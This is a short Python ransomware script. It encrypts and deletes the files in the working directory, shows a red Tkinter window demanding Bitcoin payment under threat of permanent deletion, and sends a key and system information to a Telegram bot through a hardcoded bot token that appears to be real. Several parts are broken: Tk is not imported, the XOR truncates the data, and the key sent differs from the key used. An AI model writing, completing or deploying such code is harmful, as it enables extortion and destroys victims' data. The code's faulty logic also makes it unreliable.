# Import necessary libraries
import os
import random
import string
import telebot

# Set up Telegram bot
bot = telebot.TeleBot("7036401524:AAGttGFaN_X6gXS94B6n8bPHQZlx9TWmCpE")

# Generate a random decryption key
def generate_key():
    key = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(16))
    return key

# Get PC information
def get_pc_info():
    pc_info = os.uname()
    return pc_info

# Create ransomware text
def create_ransom_text():
    ransom_text = "Your PC has been infected with ransomware. To decrypt your files, please send payment to the following Bitcoin address: 1234567890. Once payment is confirmed, a decryption key will be sent to you. If payment is not received within 24 hours, all your files will be permanently deleted."
    return ransom_text

# Create a red window
def create_red_window():
    # Create a red window with white font
    red_window = Tk()
    red_window.title("Ransomware")
    red_window.configure(background="red")
    ransom_text = create_ransom_text()
    Label(red_window, text=ransom_text, fg="white", bg="red", font=("Arial", 12)).pack()
    red_window.mainloop()

# Encrypt files
def encrypt_files():
    # Get current directory
    current_dir = os.getcwd()
    # Loop through all files in directory
    for file in os.listdir(current_dir):
        # Check if file is not already encrypted
        if not file.endswith(".encrypted"):
            # Open file and read its contents
            with open(file, "rb") as f:
                data = f.read()
            # Generate a random key
            key = generate_key()
            # Encrypt the file using XOR encryption
            encrypted_data = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, key))
            # Write encrypted data to a new file with .encrypted extension
            with open(file + ".encrypted", "wb") as f:
                f.write(encrypted_data)
            # Delete original file
            os.remove(file)

# Send decryption key and PC information to Telegram bot
def send_key_to_bot(key, pc_info):
    # Create a message with key and PC information
    message = "Decryption key: " + key + "\nPC information: " + str(pc_info)
    # Send message to bot
    bot.send_message("mbkmadmax", message)

# Main function
if __name__ == "__main__":
    # Create a red window
    create_red_window()
    # Encrypt files
    encrypt_files()
    # Get PC information
    pc_info = get_pc_info()
    # Generate a decryption key
    key = generate_key()
    # Send key and PC information to Telegram bot
    send_key_to_bot(key, pc_info)